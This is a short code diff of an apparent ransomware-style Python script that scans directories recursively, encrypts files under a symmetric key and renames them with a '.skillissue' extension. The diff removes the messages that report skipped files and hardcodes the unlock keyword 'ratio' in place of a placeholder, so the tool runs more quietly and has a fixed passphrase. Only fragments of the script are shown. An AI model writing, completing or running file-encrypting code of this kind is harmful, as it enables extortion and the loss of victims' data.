@@ -9,7 +9,6 @@ def generate_symmetric_key():
 
 def encrypt(dataFile, symmetric_key):
     if dataFile.name.endswith('.skillissue'):
-        print(f"Skipping {dataFile.name}. File is already encrypted.")
         return
 
     with open(dataFile, 'rb') as f:
@@ -24,7 +23,6 @@ def encrypt(dataFile, symmetric_key):
 
 def decrypt(dataFile, symmetric_key):
     if not dataFile.name.endswith('.skillissue'):
-        print(f"Skipping {dataFile.name}. File is not encrypted.")
         return
 
     with open(dataFile, 'rb') as f:
@@ -46,7 +44,7 @@ def scanRecurse(baseDir):
 
 def verify_keyword(keyword):
     # Modify this function to check if the keyword is correct
-    return keyword == "your_keyword_here"  # Replace "your_keyword_here" with your desired keyword
+    return keyword == "ratio" 
 
 # Generate a symmetric key (store it securely)
 symmetric_key = generate_symmetric_key()
